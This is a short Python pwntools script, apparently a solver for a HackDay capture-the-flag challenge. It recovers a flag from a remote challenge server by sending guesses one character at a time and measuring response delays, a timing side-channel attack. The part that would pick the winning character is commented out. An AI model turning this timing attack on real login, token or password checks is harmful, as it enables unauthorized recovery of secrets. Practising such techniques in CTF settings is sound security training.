from pwn import *
import time
import string

# context.log_level = 'debug'

# Remote connection setup
remote_host = 'challenges.hackday.fr'
remote_port = 48118

choice = bytearray(
                b"0123456789"+
                b"abcdefghijklmnopqrstuvwxyz" +  # Lowercase
                b"_{}" +                         # Underscore
                b"ABCDEFGHIJKLMNOPQRSTUVWXYZ" 
            )  # Uppercase

def main():
    FLAG = bytearray(b"HACKDAY{Th")
    # Establish connection
    conn = remote(remote_host, remote_port)
    print(f"[+] Connected to {remote_host}:{remote_port}\n\n")
    response = conn.recvline(timeout=1).decode()

    while len(FLAG) < 21:
        FLAG += b"\x00"
        
        i = 0
        results = {c: 0 for c in choice}
        while i < len(choice):
            FLAG[-1] = choice[i % len(choice)]

            b = time.time()
            conn.sendline(FLAG + b"A"*(20-len(FLAG)) + b"}")
            response = conn.recvline().decode()
            a = time.time()
            delta = a - b
            # results[FLAG[-1]] += delta
            print(FLAG, chr(FLAG[-1]), delta)
            # if delta > len(FLAG) * 1.15:
            #     break
            i += 1
        # max_key = max(results, key=results.get)
        # FLAG[-1] = max_key
        # print("key", chr(max_key))
        print(FLAG)

    print("\n\n")
    conn.close()


if __name__ == "__main__":
    main()
